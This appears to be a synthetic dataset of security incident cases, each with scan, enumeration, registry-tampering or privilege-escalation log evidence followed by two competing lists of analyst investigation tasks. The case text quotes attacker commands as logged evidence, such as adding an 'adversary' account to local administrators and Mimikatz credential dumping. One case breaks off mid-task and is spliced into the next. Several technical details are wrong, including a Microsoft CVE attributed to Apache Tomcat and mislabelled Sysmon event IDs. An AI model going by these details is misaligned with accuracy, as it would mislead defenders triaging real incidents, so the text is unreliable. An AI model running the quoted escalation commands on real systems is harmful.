case_title: External port scanning attempt from 147.23.189.34 targeting corporate endpoints detected by Cisco ASA firewall
case_description: Firewall logs from Cisco ASA show 34 TCP SYN packets originating from 147.23.189.34 destined for internal host 10.10.12.45 on ports 22, 80, 443, 3306, 3307, and 5432 over a 5‑minute window; SNORT IDS alert ID 2000001 (port scan, TCP SYN scans) triggered for the same source; NetFlow reports indicate 120 unique destination ports from 147.23.189.34 with >5 packets each and an average interval of 3 seconds between attempts; host‑based audit logs on 10.10.12.45 reveal no legitimate scanning processes or scheduled tasks; ICMP echo requests from 147.23.189.34 to 10.10.12.45 were detected concurrently; security event manager correlates the incoming SYN flood with an anomalous spike in inbound traffic to SSH and database services.
model_a_tasks:
Task #1  
Title: Confirm Integrity of Cisco ASA Logs  
Description: Verify that the firewall logs were not tampered with by checking file checksums and ensuring timestamps align with the SNORT alert times. Cross‑reference the log entries with NetFlow flow timestamps to confirm consistent packet counts. Highlight any discrepancies that could indicate log manipulation.

Task #2  
Title: Conduct Threat Intelligence Lookup on Source IP  
Description: Query external threat‑intel feeds for reputation and historical activity of 147.23.189.34. Determine if the IP appears on known scanning or malicious IP databases and assess the severity of the threat based on past behavior.

Task #3  
Title: Review Host Authentication and System Logs  
Description: Scrutinize sshd, sudo, and database authentication logs for any failed or successful login attempts from the scanning IP. Check for anomalous process launches or privilege escalations that could indicate a compromised account. Correlate any findings with the scan window timestamps.

Task #4  
Title: Verify Host Configuration and Patch Status  
Description: Run a vulnerability scanner on 10.10.12.45 targeting services exposed on ports 22, 80, 443, 3306, 3307, and 5432. Confirm that all critical security patches are up‑to‑date and that default credentials have been changed. Flag any unpatched CVEs that may be exploitable.

Task #5  
Title: Inspect Network Connections on Target Host  
Description: Use netstat or ss to list all established connections on 10.10.12.45 during the scan window. Identify any connections to 147.23.189.34 that persisted beyond the SYN packets, which could indicate data exfiltration or command‑and‑control activity, and document port numbers and protocol usage.

Task #6  
Title: Run Host‑Based Malware Scan  
Description: Execute anti‑virus/malware scans on 10.10.12.45 to search for trojans, backdoors, or system modifications. Examine system files and registry (if applicable) for malicious artifacts associated with port scanning or exploitation. Report findings to the incident response team.

Task #7  
Title: Correlate All Security Event Data  
Description: Aggregate firewall, SNORT, NetFlow, host logs, and SIEM alerts into a single correlation engine. Identify overlapping anomalies, secondary attacks, or indicators of subsequent exploitation. Ensure temporal alignment with the scanning event sequence.

Task #8  
Title: Block Source IP and Validate Prevention  
Description: Update firewall ACLs and corporate IDS rules to deny traffic from 147.23.189.34. Monitor for any attempts to re‑establish connection and verify that the block is enforced downstream. Log block events for audit and future reference.

Task #9  
Title: Conduct Post‑Scanning Security Assessment  
Description: Perform a thorough review of any user accounts that accessed 10.10.12.45 after the scan. Revoke or change credentials if suspicious activity is detected, and strengthen account policies accordingly. Document any changes and policy updates.

Task #10  
Title: Document Investigation Findings and Recommendations  
Description: Compile observations, tools used, evidence collected, and actions taken into a formal incident report. Provide recommendations for hardening SSH and database services, tightening IDS rules, and enabling continuous monitoring. Deliver the report to stakeholders and security governance.
model_b_tasks:
Task #1  
Title: Cross‑check Cisco ASA logs for consistency  
Description: Open the Cisco ASA log archives surrounding the alert timestamp and confirm that the recorded TCP SYN packets, source/destination IPs, ports, flags, and timestamps match the description of the 147.23.189.34 scan activity. Verify there are no duplicate entries or tampering indications to ensure the evidence is reliable for subsequent steps.  

Task #2  
Title: Audit services and patch level of 10.10.12.45  
Description: Run a configuration audit on the internal host 10.10.12.45 to list all open ports and running services (SSH, HTTP/HTTPS, MySQL, PostgreSQL). Compare each service's version against current security advisories to identify missing patches or known vulnerabilities that could be exploited by the observed scanner.  

Task #3  
Title: Immediately block 147.23.189.34 on Cisco ASA  
Description: Add a dynamic deny rule to the ASA that blocks all inbound traffic from 147.23.189.34 to prevent further scanning attempts, prioritized on SSH, database, and web services. Apply the rule promptly and verify that traffic from this IP is dropped in real time by checking firewall real‑time logs.  

Task #4  
Title: Investigate reputation and IOC history for 147.23.189.34  
Description: Query multiple threat intelligence sources (AlienVault OTX, IBM X‑Force, Recorded Future, CrowdStrike) for historical activity associated with 147.23.189.34, including malware drops, C2 infrastructure, or mentions in past investigations. Determine if the IP is linked to known scanner networks or threat actor groups.  

Task #5  
Title: Drill deeper into NetFlow export for scanner footprint  
Description: Export detailed NetFlow data for the 5‑minute window and aggregate by destination port on 10.10.12.45. Identify if other internal hosts were similarly scanned and map the breadth of the scan across the network. Calculate the packet rate per port to assess scan aggressiveness and potential for a SYN flood.  

Task #6  
Title: Verify rule ID 2000001 firing across multiple sensors  
Description: Search logs from all deployed IDS devices for simultaneous port scan alerts triggered by the same source IP using rule ID 2000001. Confirm that the signature parameters (probe type, port range, rate) match the observed SYN packets, ruling out false positives or misconfigurations.  

Task #7  
Title: Create forensic image of 10.10.12.45 for later analysis  
Description: Use a production‑grade forensic imaging tool (e.g., FTK Imager, ddrescue) to capture a bit‑for‑bit copy of the host’s disk and live memory snapshots under controlled conditions. Store the images in write‑block mode with hash verification to preserve evidence integrity for potential deeper forensic investigation.  

Task #8  
Title: Search host logs for hidden scanning processes  
Description: Inspect Windows Security Event logs (e.g., Process Creation events) and Linux audit logs for evidence of stealthy scanning tools or anomalies such as orphaned processes, hidden services, or scheduling remnants. Employ forensic suites (Autopsy, Volatility) to uncover hidden registry keys or modifying system files that could indicate persistence or automated scanning activity.  

Task #9  
Title: Run vulnerability scans against 10.10.12.45 post‑incident  
Description: Deploy Nessus or OpenVAS from a clean host to conduct a comprehensive vulnerability assessment against services on ports 22, 80, 443, 3306, 3307, and 5432. Prioritize findings with CVSS scores above 7.0 and check for exposure of default credentials, weak encryption, or known exploits.  

Task #10  
Title: Look for lateral movement evidence from 147.23.189.34  
Description: Analyze NetFlow for outbound connections from internal hosts to IPs 147.23.189.34 post‑scan. Examine SMB, RDP logs, and Windows Event ID 4624 for authentication attempts that originate from the scanner’s IP, indicating potential lateral movement or pre‑exploit reconnaissance.  

Task #11  
Title: Create adaptive rate‑limiting rule for recurring scans  
Description: Configure the Cisco ASA to limit SYN attempts from 147.23.189.34 to 50 per minute, using the rate‑limit feature to mitigate SYN flood risk without a full block. Monitor traffic to assess compliance, and elevate the threshold only if legitimate traffic is observed from a whitelisted range.  

Task #12  
Title: Store all relevant logs, images, and findings  
Description: Archive firewall, IDS, NetFlow, host audit logs, and forensic images in the SOC case repository using hashed identifiers and timestamp metadata. Document chain‑of‑custody procedures and create backup copies in SIEM long‑term storage to support future investigations or legal proceedings.  

Task #13  
Title: Notify network, application, and threat intelligence teams  
Description: Communicate the immediate block action and potential risk to network operations, scheduling the removal of the IP block once analysis confirms no legitimate activity from that source. Alert application owners of the scan on critical services (SSH, MySQL, PostgreSQL) and recommend urgent patching or hardening. Share enriched threat intel details with the global threat intel group for broader situational awareness.  

Task #14  
Title: Deliver concise findings and action items to executive stakeholders  
Description: Produce an executive summary outlining the detection vector, affected assets, mitigations applied, and risk assessment. Estimate potential data exposure scope and recommend investment for patch management, network segmentation, or advanced detection tooling.  

Task #15  
Title: Evaluate efficacy of port scan detection rules  
Description: Conduct a post‑mortem of IDS rule ID 2000001 to assess detection sensitivity, false‑positive rate, and responsiveness. Adjust threshold values or incorporate additional signatures (e.g., NULL scans, Xmas scans) to cover stealthy reconnaissance tactics. Update SOAR playbooks accordingly and validate changes in a staging environment before production rollout.

case_title: External scanner 203.0.113.45 probes internal host 10.10.10.23 for open ports
case_description: Firewall log: 2026‑03‑09T12:34:56Z, SrcIP 203.0.113.45, DstIP 10.10.10.23, Proto TCP, DstPort 22, Flags SYN; IDS Snort alert ID 100001 – TCP SYN scan detected from 203.0.113.45 at 12:35:02Z; NetFlow record: 78 sessions, 24,000 bytes, avg packet size 307, src 203.0.113.45 to dst 10.10.10.23; Syslog gateway entry: “Connection attempt from 203.0.113.45 to 10.10.10.23 port 22 at 12:34:56”; Packet capture (hex dump excerpt): series of SYN packets to ports 22, 21, 80, 443, 8080, 3306 from 203.0.113.45; DNS logs: internal hosts queried unknown.com at 12:33:00; Authentication logs: no successful logons on 10.10.10.23; Source IP geolocation: United States, ASN 398, Example ISP; Threat intelligence: IP 203.0.113.45 previously tagged in scanning campaigns.
model_a_tasks:
Task #1  
Title: Confirm scan payload and targeted ports.  
Description: Extract the list of ports from the firewall inspection and Snort alert, verifying that SYN packets were sent to ports 22, 21, 80, 443, 8080, and 3306. Cross‑check these ports against the internal host 10.10.10.23’s current allowed-open list in the firewall ACL to see if any are incorrectly permissive.  

Task #2  
Title: Verify internal host response to SYN attempts.  
Description: Review 10.10.10.23’s host firewall logs and authentication logs for any SYN/ACK or RST packets returned to 203.0.113.45. Use NetFlow data to confirm whether any return traffic was recorded, which would indicate that the host accepted or rejected the connection attempts.  

Task #3  
Title: Correlate packet capture to identify handshake outcomes.  
Description: Parse the provided hex dump to reconstruct the TCP state machine, confirming that after each SYN the host sent a RST (or no response at all). Ensure no unexpected payloads were transmitted by the scanner or the host during the session.  

Task #4  
Title: Investigate DNS resolution for unknown.com.  
Description: Resolve the queried domain “unknown.com” to its IP(s) and check if the target IP is listed in any malicious or phishing database. Correlate any malicious DNS resolution with the scanning activity to determine if a command-and-control or staging server was contacted.  

Task #5  
Title: Analyze authentication and syslog for intrusion signs.  
Description: Scan auth and syslog logs on 10.10.10.23 for any failed or successful SSH logon attempts from 203.0.113.45 or related IPs around the same 12:34‑12:36 window. Also examine other services (e.g., web, database) for abnormal login patterns that could signify lateral movement.  

Task #6  
Title: Cross‑reference threat intel on scanning IP.  
Description: Pull the latest intelligence feeds for 203.0.113.45, looking for known malicious campaigns, exploit usage, or malware drops associated with this IP. Update the SOC rule base and share findings with the network team so any future traffic from this address can be flagged automatically.  

Task #7  
Title: Validate internal host vulnerability posture.  
Description: Run a light vulnerability scan (e.g., OpenVAS or Nessus) against 10.10.10.23’s listening services on the ports targeted by the scanner. Verify patch and version status for SSH, HTTP(S), FTP, and MySQL to assess whether known CVEs could be exploited by a scanner.  

Task #8  
Title: Update firewall mitigation rules.  
Description: Implement an immediate rule to block or rate‑limit traffic from 203.0.113.45 to 10.10.10.23 (and optionally the whole 10.10.10.23 subnet) until a threat assessment concludes it is safe to allow interactions. Ensure that legitimate traffic (e.g., internal VPN or management sessions) remains unaffected.  

Task #9  
Title: Create incident documentation and action plan.  
Description: Compile all evidence—firewall logs, IDS alerts, NetFlow record, packet capture, DNS query details, authentication logs, and threat intel findings—into the SOC case file. Outline the impact assessment, recommended remediation steps, and schedule a follow‑up review to ensure the host remains secure.
model_b_tasks:
Task #1
Title: Validate SYN scan activity on host 10.10.10.23
Description: Retrieve packet capture segments around 12:34:56Z to 12:35:02Z from the campus perimeter analyzer. Verify that source IP 203.0.113.45 sent multiple TCP SYN packets to distinct ports on 10.10.10.23. List ports targeted (22, 21, 80, 443, 8080, 3306) and confirm absence of SYN‑ACK or RST responses indicative of nothing listening. This confirms a reconnaissance‑style port scan.

Task #2
Title: Assess potential exploitation attempts on scanned ports
Description: Scrutinize IDS logs and host‑level logs for any connections on ports 22, 21, 80, 443, 8080, 3306 that followed the scan and may have been attempts to exploit vulnerabilities. Search for suspicious artifacts such as unusual payloads, failed authentication attempts, or exploitation success markers. Cross‑reference with known vulnerability signatures (e.g., SSH brute force, CVE‑2023‑23397 on Apache Tomcat on port 8080).

Task #3
Title: Verify host integrity and configuration changes on 10.10.10.23
Description: Run a file integrity checker or diff baseline versus current state for system and service configuration files. Inspect crontab, systemd timers, and autorun entries for unauthorized additions. Look for newly installed binaries or libraries not present in normal operation. Check /var/log/auth.log for any unauthorized sudo sessions or root logins from this IP.

Task #4
Title: Investigate DNS query for unknown.com
Description: Correlate the DNS log entry for internal hosts querying unknown.com at 12:33:00Z with outbound connection logs. Identify which internal host performed the query and resolve IP addresses returned for unknown.com. Check for outgoing connections from that host to these IPs. Use threat intel to assess if unknown.com is a known command‑and‑control host or part of a malicious campaign.

Task #5
Title: Correlate threat intelligence on source IP 203.0.113.45
Description: Gather up‑to‑date intel: reputation scores, historical activity records, affiliation with known botnets. Review if the scan pattern matches any documented threat actor behavior patterns or campaigns. Determine if this IP hosts any scheduled vulnerability scans or is part of a legitimate service (e.g., Nessus, Qualys). If definitively malicious, decide on blocking action.

Task #6
Title: Implement firewall rule to block traffic from 203.0.113.45
Description: Based on assessed risk, create a deny rule at the perimeter firewall for all traffic originating from 203.0.113.45 to internal subnets. Use rate‑limiting or temporary block initially if uncertain of source legitimacy. Monitor enforcement efficacy and verify that subsequent scan attempts are suppressed.

Task #7
Title: Enhance monitoring of host 10.10.10.23 post‑scan
Description: Deploy auditd rules for key system files and directories. Configure continuous network packet capture on the host’s local interface to capture any post‑scan activity. Enable high‑frequency logging for authentication events. Set up real‑time alerts for SSH brute‑force patterns, failed MySQL logins, or HTTP requests to unknown paths.

Task #8
Title: Examine network segmentation and internal firewall rules
Description: Map the VLAN and subnet boundaries between 203.0.113.45 and 10.10.10.23. Verify that internal firewall policies enforce least privilege, preventing unnecessary inbound connections. Check if any static routes or DMZ zones inadvertently expose internal hosts to external IP ranges. Document any policy gaps and recommend tightening segmentation.

Task #9
Title: Notify Incident Response Team and stakeholders
Description: Generate standardized notification via SOAR to the Incident Response Team, summarizing detection event, affected asset, scan details, and recommended mitigation. Inform affected department heads to remain vigilant for signs of exploitation. Provide contact information for immediate escalation if any suspicious activity emerges.

Task #10
Title: Consolidate findings and update SOC playbooks
Description: Compile evidence, logs, and executed mitigations into an incident report. Highlight key indicators of compromise, source reputation, and effective response actions. Submit report to incident response leadership. Update SOC playbooks to automatically detect similar scan signatures and iterate mitigation steps (block IP, increase logging, alert stakeholders). Include link to threat intel source for future reference.

Task #11
Title: Expand investigation to other internal hosts
Description: Query NetFlow data for parallel SYN scan activity targeting other internal assets during the same timeframe. Identify any patterns of scanning across system segments. Prioritize investigation of hosts with high vulnerability scores or critical services. Determine if multiple external IPs participated in a coordinated reconnaissance effort.

Task #12
Title: Schedule post‑incident review and policy adjustment
Description: Convene a cross‑departmental review focusing on detection efficacy, response coordination, and policy gaps exposed by this incident. Evaluate the need for implementing IDS protection for internal networks, honeypot deployment, or stricter Internet access controls. Update security policies accordingly and communicate changes to all staff.

case_title: Suspicious internal enumeration of domain resources from workstation WS-23 during off‑hours
case_description:
- Windows Security Log (Event ID 4625) shows 15 failed logon attempts to DomainController-01 from WS-23 between 01:00–01:30 UTC.  
- Sysmon ProcessCreate log: cmd.exe invoked with arguments “net view \\DomainController-01 /all & nbtstat -A 10.0.0.5” from WS-23.  
- PowerShell transcript: “Get-ADComputer -Filter *” executed by user jdoe from WS-23.  
- Network flow logs: 20 TCP connections from WS-23 to IP addresses 10.0.0.5 and 10.0.0.6 on ports 445 and 135 within the same time frame.  
- Endpoint EDR: creation of C:\\temp\\enumReport.txt containing output of the “net view” command, written by powershell.exe.  
- Registry modification: HKCU\\Environment\\PATH appended with “C:\\temp” on WS-23.  
- A scheduled task “DomainEnum” created under jdoe’s profile to run hourly enumeration script “enumScript.ps1”.
model_a_tasks:
Task #1
Title: Validate the source and context of the failed logons from WS-23 to DomainController-01
Description: Review the Windows Security logs (Event ID 4625) to confirm the originating account, computer name, and IP address for each of the 15 failed attempts. Correlate these attempts with the timestamps recorded in the alert and verify that no unrelated accounts were targeted. Identify whether the failures are associated with a brute‑force pattern or a single credential misuse.

Task #2
Title: Correlate jdoe’s PowerShell enumeration activity with failed login attempts
Description: Extract the full PowerShell transcript for the “Get‑ADComputer –Filter *” command, capturing its exact runtime, parameters, and output. Match the transcript timestamp with the failed logons to determine if jdoe attempted to authenticate before executing enumeration. Confirm that the enumeration command was executed successfully or if it relied on credentials from a failed session.

Task #3
Title: Reconstruct and review the cmd.exe net view command executed on WS‑23
Description: Retrieve the full command line invoked by cmd.exe, including any environment variables that may have impacted its execution. Parse the output captured in C:\temp\enumReport.txt to identify shared resources, server names, and any unexpected shares. Investigate whether the command sequence indicates manual, scripted, or automated enumeration.

Task #4
Title: Inspect the contents of C:\temp\enumReport.txt for enumerated resources
Description: Open the file created by powershell.exe to list all SMB shares, user accounts, and domain objects discovered during the enumeration. Verify that the reported resources match the network connections shown in the flow logs. Flag any sensitive or privileged shares that should not be openly enumerated by a standard user.

Task #5
Title: Audit the newly created scheduled task “DomainEnum” in jdoe’s profile
Description: Examine the task XML to confirm the trigger, action, and conditions of the hourly execution. Verify the task’s owner, security context, and whether it was created by a legitimate user or an attacker. Check the script path and execution rights to see if the task could provide persistence or privileged escalation.

Task #6
Title: Verify the integrity and intent of enumScript.ps1
Description: Retrieve the PowerShell script that the scheduled task runs and review its code for enumeration, lateral movement, or malicious payload delivery. Cross‑reference the script’s functions with known malicious scripts (e.g., mimikatz, bloodhound) and look for obfuscated segments or external downloads. Ensure no persistent registry keys or scheduled tasks are added by this script.

Task #7
Title: Assess the registry PATH modification for potential persistence
Description: Examine the HKCU\Environment\PATH entry to determine whether the addition of C:\temp was intentional (e.g., for quick script execution) or malicious (e.g., to route execution to a compromised directory). Compare the current PATH value against the baseline for the user jdoe. Look for other unexpected environment variable changes or persistence mechanisms.

Task #8
Title: Capture and analyze SMB traffic on ports 445 & 135 to DomainController-01
Description: Collect packet captures for the 20 TCP connections between WS‑23 and the IP addresses 10.0.0.5/6 on ports 445 and 135 during the 01:00–01:30 UTC window. Decode the SMB protocol to verify share enumeration activity, authentication attempts, and data transfers. Confirm whether the traffic patterns align with the cmd.exe and PowerShell commands logged.

Task #9
Title: Determine if enumeration activity led to lateral movement or compromised credentials
Description: Cross‑reference subsequent authentication events to see if new logons or privilege escalations occurred after the enumeration. Check Windows Event ID 4624 logs for successful logons from WS‑23 to other domain computers or elevated accounts. Search EDR data for indications of remote code execution or file copy operations targeting critical systems.

Task #10
Title: Compare current activity against established normal baseline for WS‑23
Description: Retrieve historical monitoring data for WS‑23 to identify typical logon times, command executions, and network connections. Highlight deviations such as off‑hour logons, unusual PowerShell scripts, or abnormal SMB traffic. Use baseline analysis to assess whether the observed enumeration is anomalous or part of an approved audit process.
model_b_tasks:
Task #1  
Title: Confirm jdoe’s Legitimate Domain Enumeration Privileges  
Description: Retrieve jdoe’s Active Directory group memberships and assigned permissions to run domain queries. Verify against organizational policy whether user jdoe is authorized to execute commands such as net view, nbtstat, or Get-ADComputer. Access AD Users and Computers or run PowerShell `Get-ADUser -Identity jdoe -Properties memberOf` to compile the list.

----

Task #2  
Title: Retrieve 'DomainEnum' Scheduled Task Definition on WS-23  
Description: Use PowerShell `Get-ScheduledTask -TaskName 'DomainEnum'` or WMI queries to pull the full XML definition of the scheduled task. Inspect trigger schedule (hourly at off‑hours), action script path (C:\temp\enumScript.ps1), and RunAsAccount (jdoe). Note any comments or descriptions that explain task ownership or purpose. Validate that the script path corresponds to known legitimate storage.

----

Task #3  
Title: Conduct Static Analysis of enumScript.ps1  
Description: Download enumScript.ps1 from WS-23. Review inline code for operations beyond enumeration—look for file writes, remote exfiltration logic, or lateral movement attempts. Compute the file’s SHA256 hash and compare against threat intelligence feeds (VirusTotal, CrowdStrike, Hybrid Analysis). case_title: Unexpected modification detected on Windows system configuration file
case_description: File path: C:\Windows\System32\config\system; original MD5: 8d4f47c2a5b6e1d3f9b2c1e8a7d8c9e0; new MD5: 5a9c12f3b4e6d7c8a1b2f3d4e5c6a7b8; file size before: 8028 bytes, after: 8123 bytes; modification timestamp: 2024‑03‑10 02:15:23 UTC; modified by process nvv.exe located at C:\Temp\nvv.exe; parent process PowerShell.exe (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe); Sysmon Event ID 10 (FileCreate) logged at 02:15:20 UTC; Sysmon Event ID 2 (ProcessCreate) for nvv.exe logged at 02:15:18 UTC; Windows Security Event 4663 (Object Access) recorded at 02:15:21 UTC; EDR alert ID 12345 from CrowdStrike flagged file modification; FIM alert from Tripwire on host HOST01 detected change, logged by endpoint agent EPT‑21.
model_a_tasks:
Task #1  
Title: Verify integrity of system configuration file  
Description: Compare the MD5 hash, size, and digital signature of `C:\Windows\System32\config\system` against the baseline stored in the FIM repository. Use PowerShell’s `Get-FileHash` and file‑diff utilities to confirm that the file's contents have indeed changed and that no corruption or benign hash collision is involved.  

Task #2  
Title: Identify the modifying user and privileges  
Description: Extract the security identifier (SID) and username from the Sysmon Event ID 2 for `nvv.exe` and correlate with Windows Security Event logs to determine whether the process ran under a privileged account, a non‑expiring service account, or a compromised user. This will help assess the attack vector and scope of compromise.  

Task #3  
Title: Assess the nvv.exe binary’s reputation  
Description: Calculate the SHA‑256 of `C:\Temp\nvv.exe`, perform a hash lookup against threat intelligence feeds, and check file name and location against known malware collections. If the file is flagged, collect indicators such as packers, obfuscation, or embedded C&C endpoints for deeper analysis.  

Task #4  
Title: Reconstruct the PowerShell command chain  
Description: Retrieve the full command line and script block used by `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` from the Sysmon Event ID 2 logs. Expand any obfuscated or Base64‑encoded payload to identify the exact instructions that launched `nvv.exe` and determine whether a legitimate or malicious script was executed.  

Task #5  
Title: Map persistence and execution channels  
Description: Search the host for additional persistence mechanisms such as Run registry keys, Scheduled Tasks, service registrations, or WMI event subscriptions that may have been created by `nvv.exe` or its parent PowerShell session. Record any service modifications, scheduled task creation, or alterations to startup folder contents.  

Task #6  
Title: Correlate network activity at modification time  
Description: Examine NetFlow, firewall logs, and host‑based IDS alerts during the 02:15:18‑02:15:23 UTC window for outbound connections initiated by `nvv.exe` or the PowerShell process. Note any unusual destination IPs, ports, or protocols that could indicate command‑and‑control communication or data exfiltration.  

Task #7  
Title: Cross‑check additional system configuration changes  
Description: Query Tripwire/EDR logs for modifications to other critical system files, registry hives, or driver binaries on HOST01 and any peer hosts. Identify patterns that suggest a broader persistence or privilege‑escalation campaign alongside the system file alteration.  

Task #8  
Title: Validate the impact on system stability and authentication  
Description: Test whether the modified `system` registry hive caused any service failures, authentication issues, or memory corruption. Run `sfc /scannow` and monitor for Error logs in the Windows System Event Log that could indicate system instability or a failed repair engine due to the tampered file.  

Task #9  
Title: Contain the compromised host  
Description: Isolate HOST01 from the network, apply the latest host‑based anti‑malware signature, and perform a full malware scan targeting the `nvv.exe` file. Schedule a read‑only snapshot of the live filesystem to preserve evidence before re‑integrating the host into the network after remediation.  

Task #10  
Title: Report findings and initiate incident response plan  
Description: Compile evidence, correlation findings, and containment actions into the SOAR case. Trigger any mandatory regulatory reporting, update the incident taxonomy, and assign follow‑up tasks for patching, policy review, and user awareness training.
model_b_tasks:
Task #1
Title: Confirm integrity of Windows system registry file
Description: Retrieve the current SHA256 hash of C:\Windows\System32\config\system and compare it to the original MD5 to verify changes. Use Get-FileHash cmdlet and confirm file size and timestamps. Check ACL entries for any unauthorized modifications. If deviations exist, proceed with a detailed forensic examination.

Task #2
Title: Acquire forensic image of system registry hive
Description: Use reg save or FTK Imager to capture the current HKLM\SYSTEM hive. Store the image in a write‑once media for analysis. This allows rollback to a clean state and further examination of related registry keys potentially altered along with the system file.

Task #3
Title: Perform static analysis of suspect nvv.exe binary
Description: Calculate the SHA256 hash and compare against AV engines and the MITRE ATT&CK CAPEC. Inspect PE headers, imports, and embedded resources using PE Explorer or strings. Look for obfuscated payload sections that might host malicious code.

Task #4
Title: Execute nvv.exe in a controlled sandbox environment
Description: Deploy a clean VM and run nvv.exe with identical command-line arguments derived from Sysmon logs. Capture filesystem and registry changes, network activity, and process creation. Use the sandbox report to quickly assess malicious behavior before initiating host‑based remediations.

Task #5
Title: Reconstruct Sysmon event chain for file change
Description: Correlate Sysmon Event ID 2 (ProcessCreate) for nvv.exe, Event ID 10 (FileCreate) targeting the system file, and Event ID 4663 (Object Access). Verify timestamp alignment and parent-child relationships. Confirm that the file modification directly resulted from the suspicious nvv.exe process.

Task #6
Title: Extract full PowerShell execution context
Description: Query PowerShell logs (Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational) to retrieve the complete command line used to launch nvv.exe. Identify use of ISE or encoded scripts. Determine whether the script originates from a captured network location or local payload.

Task #7
Title: Expand CrowdStrike EDR alert investigation
Description: Open alert ID 12345, review detailed event timeline, process metadata, and associated ATT&CK technique ID. Note any indicators flagged by machine learning or heuristics. If multiple alerts reference the same artifact, correlate severity and confidence scores to prioritize containment.

Task #8
Title: Analyze Tripwire Fine‑Grained Integrity Monitoring alert
Description: Access the Tripwire event for the host HOST01, examine raw event data including rule matched, file attributes, and baseline comparison. Confirm that the detected hash change is not a false positive from a legitimate OS update. Flag the alert if baseline drift cannot be justified.

Task #9
Title: Investigate persistence mechanisms introduced by nvv.exe
Description: Search for scheduled tasks, Windows services, and run‑key entries created by nvv.exe. Use Autoruns or PowerShell registry queries (Get-ItemProperty) to identify persistence vectors. Verify file paths and service start types to assess stealthiness.

Task #10
Title: Correlate network activity of suspicious process
Description: Use Netstat, TCPView, or SIEM packet logs to capture outbound connections from nvv.exe during the 02:15:18–02:15:23 UTC window. Identify destination IPs, ports, and protocols. Cross reference IPs against threat intel feeds (AlienVault OTX, MISP) for known malicious entities.

Task #11
Title: Cross‑check Windows Security logs for anomalous logon activity
Description: Query Event ID 4624 (logon) and 4625 (failed logon) around the modification timestamp. Look for unusual logon types (e.g., RemoteInteractive), foreign domain credentials, or accounts performing elevated actions. Investigate any accompanying account lockouts or privilege upgrades.

Task #12
Title: Document findings and prepare containment ticket
Description: Compile evidence including file hashes, process lineage, network connections, and persistence artifacts. Draft recommended actions: isolate host, terminate malicious processes, revoke compromised credentials, block identified IPs. Escalate to incident response team for eradication, recovery, and post‑incident analysis. Adjust detection rules in CrowdStrike and Tripwire to reduce future false positives.

case_title: Privilege escalation attempt detected on critical Windows infrastructure server
case_description:
- Windows Security Log Event ID 4728: account “adversary” added to the local Administrators group on Server-01 at 02:13:45 UTC.  
- Process creation event: PowerShell script “C:\Scripts\privEsc.ps1” executed with parameters to add “adversary” to administrators, hash captured in Security Event ID 4688.  
- Scheduled Task created: “ElevateAdminTask” with trigger at logon, action “C:\Windows\System32\cmd.exe /c net localgroup administrators adversary /add”, run under SYSTEM context, logged by Task Scheduler.  
- File system activity: C:\Users\Public\Temp\x64.exe copied from SMB share \\FileSrv\public and executed under SYSTEM.  
- Network: New outbound TLS connection to 203.0.113.45:443 initiated by process ID 4128 on Server-01, established 02:15:02 UTC.  
- Credential dumping: Mimikatz v1.5 executed on Server-01 at 02:16:30 UTC, resulting in Security Event ID 4663 on LSASS process.  
- Event ID 4670: Permissions on C:\ProgramData\secure.cfg changed from ReadOnly to FullControl for user “adversary” at 02:17:10 UTC.  
- Unexpected remote login: user “adversary” logged on from IP 198.51.100.25 via RDP at 02:18:05 UTC, S-1-5-21-…-65535.  
- Group policy: GPO “PrivEscPolicy” applied on domain controller at 02:20:01 UTC, disabling UAC.  
- Security log: Windows Security Event ID 4624 for “adversary” shows logon type 10 (RemoteInteractive) from unknown workstation.
model_a_tasks:
Task #1
Title: Collect all relevant Windows logs from Server-01  
Description: Retrieve the full System, Security, and Application event logs for the time window surrounding the privilege escalation (02:10-02:20 UTC). Include any Sysmon or PowerShell transcript logs that may exist. Preserve the raw CSV or EVTX files for forensic analysis.

Task #2
Title: Verify integrity and content of the PowerShell script privEsc.ps1  
Description: Open the script located at C:\Scripts\privEsc.ps1 and compare it against a known good baseline, if available. Check for obfuscation, base64 encoded payloads, or embedded commands that elevate privileges. Capture the file hash for later reference.

Task #3
Title: Analyze the scheduled task ElevateAdminTask configuration  
Description: Inspect the task’s XML definition to confirm trigger, action, authentication settings, and security descriptor. Verify that it runs under the SYSTEM account and ensure no unintended persistence mechanism is in place. Cross‑check with the Task Scheduler log for creation and execution timestamps.

Task #4
Title: Examine the download and execution of x64.exe from the SMB share  
Description: Retrieve the file from C:\Users\Public\Temp\x64.exe, hash it, and run static analysis in a sandbox to identify malware characteristics. Confirm the SMB share \\FileSrv\public’s trust level and investigate any other files recently copied from that share.

Task #5
Title: Correlate the outbound TLS connection to 203.0.113.45  
Description: Use network flow logs and firewall logs to confirm the source process (PID 4128) and to determine if the connection is legitimate or malicious. Correlate with Internet Service Provider information to assess the reputation of the remote host.

Task #6
Title: Investigate Mimikatz activity and LSASS access  
Description: Correlate the Security Event ID 4663 on the LSASS process with the Mimikatz execution event (PID 4688). Identify any LSA secrets or cached credentials retrieved. Check for related memory injection events or presence of other credential dumping tools.

Task #7
Title: Inspect file permission changes on secure.cfg  
Description: Review the audit trail for event ID 4670 to confirm the change from ReadOnly to FullControl. Determine the initiator of the permission change and verify whether it was performed by the adversary account or a legitimate administrator. Check for similar changes on other critical configuration files.

Task #8
Title: Validate the RDP session from IP 198.51.100.25  
Description: Examine the 4624 logon event for RemoteInteractive logon, cross‑reference with Network Information Center logs to confirm the session’s network path, and check IP reputation databases for malicious activity. Determine whether this RDP session was authenticated prior to the privilege escalation.

Task #9
Title: Review GPO PrivEscPolicy modifications on the domain controller  
Description: Audit the GPO application event at 02:20:01 UTC to confirm who authorized the change. Verify that UAC was disabled by inspecting the registry and group policy settings on affected servers. Check for any other policy violations introduced by this GPO.

Task #10
Title: Confirm the current UAC state on Server-01 and peer servers  
Description: Run gpresult /R on Server-01 to display applied policies and confirm that UAC is indeed disabled. Execute a local audit to ensure that all servers in the domain have the expected UAC configuration.

Task #11
Title: Search for additional accounts with elevated privileges  
Description: Query Active Directory for any accounts named “adversary” or similar ones that have the Administrators group membership. Check for other newly created users or groups that may have been added in the same timeframe. Verify the creation time, owner, and group memberships for these accounts.

Task #12
Title: Perform forensic memory analysis of Server-01  
Description: If possible, recover a memory dump of the Server-01 system around the time of the events. Use tools such as Volatility or Rekall to search for hidden processes, injected DLLs, and remnants of Mimikatz. Correlate findings with the event timeline to identify any additional stealth persistence mechanisms.
model_b_tasks:
Task #1
Title: Verify origin of “adversary” account creation
